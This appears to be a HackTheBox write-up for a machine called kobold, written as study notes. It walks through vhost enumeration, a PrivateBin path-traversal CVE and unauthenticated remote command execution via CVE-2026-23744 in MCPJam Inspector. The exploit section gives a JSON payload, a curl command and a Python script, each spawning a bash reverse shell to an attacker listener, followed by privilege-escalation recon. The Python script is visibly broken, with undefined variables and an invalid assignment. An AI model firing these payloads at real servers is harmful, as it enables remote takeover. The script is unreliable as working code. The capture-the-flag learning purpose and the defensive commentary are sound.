tl;dr: found the real CVE-2026-23744 github refs (the MCPJam/inspector repo itself, the patch commit + GitHub's own security advisory), so the doc's fully sourced now. full rewrite below, links dropped inline as they come up plus the consolidated table at the end.

## table of contents

- [1. the 80/20 digest](#1-the-8020-digest)
- [2. structured breakdown](#2-structured-breakdown)
- [3. feynman checks](#3-feynman-checks)
- [4. omitted chuff](#4-omitted-chuff)
- [5. watch it explained](#5-watch-it-explained)
- [references](#references)
## 1. the 80/20 digest

**recon**

first thing i did was throw nmap at it: `nmap -p- -sV -sC`. i scan all 65535 ports with `-p-`, not just the top 1000, because i've been burned before by a vulnerable service sitting on some weird port that the default scan just skips. `-sV` grabs version numbers, which is the whole game really: once i know a version, i know what CVEs to go hunting for. `-sC` just runs nmap's safe default scripts on top, free extra recon, nothing i need to think hard about.

q: why bother with `-p-` instead of the default top 1000? a: a vulnerable service could be sitting on a nonstandard port the default scan never touches.

http was open so i gobustered it. nothing useful on the raw domain itself, but that's not where this box lives.

**finding the real attack surface**

the working command that actually got me somewhere: `gobuster vhost -u https://kobold.htb:443/ -w subdomains-top1million-110000.txt --domain kobold.htb --append-domain -k`

`vhost` mode is the part that matters here, i'm not bruteforcing folders, i'm bruteforcing the Host header. one ip can serve completely different sites depending what hostname you ask for, and neither a port scan nor a normal dns lookup will ever show you that; you have to actively guess names and see what the server answers to. `--domain` + `--append-domain` just glue my wordlist words onto kobold.htb so i'm sending real hostnames instead of bare words. `-k` skips cert verification, htb boxes run self-signed certs so without it curl/gobuster just refuses to talk to it.

that turned up `mcp.kobold.htb` and `bin.kobold.htb`, both 200. i edited `/etc/hosts` so my box actually resolves those names, since htb targets aren't on real dns.

q: why does a plain port scan completely miss these two subdomains? a: they're virtual hosts, not separate ports, you only find them by guessing hostnames in the Host header.

**cybersec angle:** this is the exact failure mode companies hit in prod too, tucking an admin panel on an unlisted subdomain and calling it secure because "nobody knows the name." it's not a control, it's obscurity. if i were defending this box, i wouldn't rely on the hostname being secret, i'd put real auth in front of anything sensitive regardless of how someone found it.

**bin.kobold.htb**

fingerprinted this as privatebin, matched the version to **CVE-2025-64714**, an lfi / path traversal bug in 2.0.2. lfi just means i can get the app to read a file path i control instead of the one it intended, and if i can walk that path back out of the app's folder with `../../../` i'm reading arbitrary files off the server.

- cve record: [cve.org CVE-2025-64714](https://www.cve.org/CVERecord?id=CVE-2025-64714)
- lfi background reading i used: [securitycipher.com, lfi and path traversal explained](https://securitycipher.com/docs/security/vulnerability-explain/local-file-inclusion-lfi-and-path-traversal/)
- poc repo: [github.com/Medaz-Sploit/CVE-2025-64714-privatebin-2.0.2-PoC](https://github.com/Medaz-Sploit/CVE-2025-64714-privatebin-2.0.2-PoC)

q: what's actually happening under the hood in an lfi? a: user input gets dropped straight into a file path without sanitizing it, so `../` sequences let you escape the intended directory.

**mcp.kobold.htb, the actual way in**

fingerprinted the mcp version, matched to **CVE-2026-23744**, unauthenticated rce. the endpoint is `/api/mcp/connect`, and it takes json describing a "server config" to run, including a `command` and `args`. there's no auth check before that command runs, which is exactly why github's own advisory classifies it under CWE-306, missing authentication for a critical function. that's the entire bug, i send json, server runs whatever i told it to.

- vendor repo (the actual vulnerable project): [github.com/MCPJam/inspector](https://github.com/MCPJam/inspector)
- the patch commit that fixed it, useful for seeing exactly what was missing: [commit e6b9cf9](https://github.com/MCPJam/inspector/commit/e6b9cf9d9e6c9cbec31493b1bdca3a1255fe3e7a)
- github's official security advisory: [GHSA-232v-j27c-5pp6](https://github.com/MCPJam/inspector/security/advisories/GHSA-232v-j27c-5pp6)

worth noting: the advisory also says this thing listens on `0.0.0.0` by default instead of `127.0.0.1`, which is a second mistake stacked on top of the missing auth, it means the vulnerable api isn't even limited to localhost, anyone who can reach the port can hit it remotely.

here's the exploit flow, attacker side vs target side:

|step|my machine|direction|target|
|---|---|:-:|---|
|1|start listener: `ncat -lnvp 9001`|||
|2|post malicious json to `/connect`|`-->`|server executes the embedded command|
|3||`<--`|its shell connects back out to me|
|4|type commands|`-->`|executed as the web/service user|

this is a reverse shell, worth being precise about why that's the choice and not a bind shell: a bind shell has the target open a listening port and wait for me, which usually dies against a firewall since inbound to random ports gets blocked. a reverse shell has the target call out to me instead, and outbound traffic almost never gets the same scrutiny, so it slips through way more often. i used [revshells.com](https://www.revshells.com/) as a quick reference/generator for the payload syntax.

the payload: `bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'`

- `bash -i` spins up an interactive shell
- `>&` redirects stdout and stderr together
- `/dev/tcp/ip/port` is a bash builtin, not a real file, it opens a raw tcp socket. this one's just memorize it, there's no deeper pattern, it's a bash quirk
- `0>&1` ties stdin into that same socket too, so now the whole shell, input and output, flows over one tcp connection back to my listener

the actual request i sent:

```
{
  "serverConfig": {
    "command": "/bin/bash",
    "args": ["-c", "sh -i >& /dev/tcp/10.10.15.9/4444 0>&1"],
    "env": {}
  },
  "serverId": "mytest"
}
```
the curl way(fast af):
```bash
curl -k https://mcp.kobold.htb/api/mcp/connect \
  --header "Content-Type: application/json" \
  --data "{\"serverConfig\":{\"command\":\"/bin/bash\",\"args\":[\"-c\", \"sh -i >& /dev/tcp/10.10.15.9/4444 0>&1\"], \"env\":{}},\"serverId\":\"mytest\"}"
```

the python script way (less pain):
```python
import requests  
import sys  
  
#Usage: python3 <rhost> <rport> <lhost> <lport>")  
#python3 script.py <target_ip> <target_port> <your_ip> <your_listening_port>
  
remote_host = sys.argv[1]  
remote_port = sys.argv[2]  
listening_ip = sys.argv[3]  
listening_port = sys.argv[4]

url = f"https://{rhost}:{rport}/api/mcp/connect"  
#grants netcat (RCE)
payload = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'" #reverse shell
#found it on github
#just send it to 
json thingie = {  
"serverConfig": {  
"command": "bash",  
"args": ["-c", payload],  
"env": {}  
},  
"serverId": "whatever"  

}  
requests.post(url, json=data, verify=False, timeout=5)
```
q: why does a reverse shell beat a bind shell against a typical firewall? a: firewalls usually allow outbound but block unsolicited inbound, so having the target call out gets past that.

**cybersec angle:** the root cause worth remembering here, any endpoint that accepts "a command to run" as structured input and has zero auth in front of it is rce by design, not an accident waiting to happen. stack a bind-to-0.0.0.0 mistake on top and you've turned a localhost dev tool into something remotely exploitable by anyone who can route to the port. if i were building this, i'd never let an endpoint spawn processes without strict auth, i'd default to binding localhost only, and i'd never pass raw user strings into a shell.

**after the shell**

landed as a low priv user, grabbed `/home/ben/user.txt`.
then the standard privesc checklist:

- `sudo -l` shows what i can run as root, the first thing i always check, `NOPASSWD` entries here are usually a straight line to root
- `id` shows my current uid/gid and group memberships
- `ps aux | grep container` spotted docker running, which is a common privesc path since being in the docker group or having socket access usually means you can mount the host filesystem from inside a container and walk straight to root

the paste cuts off before root actually happens, but that docker sighting is the strong lead. the writeup i was cross referencing against for the overall flow: [medium.com/@p3lured, kobold hackthebox write up](https://medium.com/@p3lured/kobold-hackthebox-write-up-5de1c7dbd44a)

q: why does spotting a docker process matter for privesc? a: docker group membership or socket access often lets you mount the host fs inside a container, which is basically a root shortcut.

## 2. structured breakdown

| phase                 | tool / technique                        | what it got me                                                            |
| --------------------- | --------------------------------------- | ------------------------------------------------------------------------- |
| port/service recon    | nmap (`-p- -sV -sC`)                    | found http(s), fingerprinted versions                                     |
| directory brute force | gobuster `dir` + seclists               | nothing useful, dead end on the main domain                               |
| vhost discovery       | gobuster `vhost` mode                   | found mcp.kobold.htb and bin.kobold.htb                                   |
| local dns fake        | `/etc/hosts` edit                       | made my box resolve the real hostnames                                    |
| lfi recon             | privatebin version fingerprint          | CVE-2025-64714, path traversal on bin.kobold.htb                          |
| rce exploit           | CVE-2026-23744 against MCPJam inspector | unauth command execution via `/api/mcp/connect`                           |
| listener              | ncat                                    | caught the reverse shell                                                  |
| payload               | `bash -i >& /dev/tcp/ip/port 0>&1`      | bash's tcp redirect trick, interactive shell over the socket              |
| privesc recon         | `sudo -l`, `id`, `ps aux`               | checked sudo rights, user context, spotted docker as the likely root path |

## 3. feynman checks

**q1: why does vhost bruteforcing find hosts a dns lookup or port scan never will?**  
a: virtual hosting means one ip/port serves multiple sites, differentiated purely by the Host header in the request, not by dns or port. a port scan sees one open port, a dns lookup only resolves names you already know to ask about. you have to actively guess hostnames and see what the server answers to.

**q2: what specific design flaw turns "accept json config" into rce in CVE-2026-23744?**  
a: the endpoint pulls `command` and `args` straight from the request body and runs them server side with no auth check first, and on top of that it listens on 0.0.0.0 by default so the flaw isn't even limited to localhost. any unauthenticated caller decides what process runs, that's attacker controlled execution by design.

**q3: if the firewall only allowed outbound 443, would my `/dev/tcp/10.10.15.9/4444` shell still work? what would i change?**  
a: no, that payload calls back on 4444 which would get blocked. i'd point both the listener and the payload at port 443 instead, since outbound 443 just looks like normal https and rarely gets flagged or inspected.

## 4. omitted chuff

- all the early failed `dir` mode gobuster attempts against the raw ip, useful trial and error but nothing new once vhost mode clicked
- the typo'd commands in my history (`gobuster vhot`, stray spaces in curl urls)
- the exact seclists wordlist filename, swap it for whatever, the technique is what matters

q: did i cut anything that actually mattered to the chain? if something here feels load bearing to you, say so and i'll fold it back in.

## 5. watch it explained

| concept                     | youtube search query                                            |
| --------------------------- | --------------------------------------------------------------- |
| vhost enumeration           | gobuster vhost enumeration explained htb                        |
| lfi / path traversal        | local file inclusion explained visually                         |
| unauthenticated rce         | unauthenticated remote code execution explained CVE walkthrough |
| reverse shell vs bind shell | reverse shell vs bind shell animated explained                  |
| bash /dev/tcp trick         | bash dev tcp reverse shell explained                            |
| docker privilege escalation | docker group privilege escalation linux explained               |

## references

| what                                  | link                                                                                                        |
| ------------------------------------- | ----------------------------------------------------------------------------------------------------------- |
| CVE-2025-64714 record                 | https://www.cve.org/CVERecord?id=CVE-2025-64714                                                             |
| lfi/path traversal explainer          | https://securitycipher.com/docs/security/vulnerability-explain/local-file-inclusion-lfi-and-path-traversal/ |
| privatebin lfi poc (github)           | https://github.com/Medaz-Sploit/CVE-2025-64714-privatebin-2.0.2-PoC                                         |
| MCPJam inspector (vulnerable project) | https://github.com/MCPJam/inspector                                                                         |
| CVE-2026-23744 patch commit           | https://github.com/MCPJam/inspector/commit/e6b9cf9d9e6c9cbec31493b1bdca3a1255fe3e7a                         |
| CVE-2026-23744 github advisory        | https://github.com/MCPJam/inspector/security/advisories/GHSA-232v-j27c-5pp6                                 |
| reverse shell generator               | https://www.revshells.com/                                                                                  |
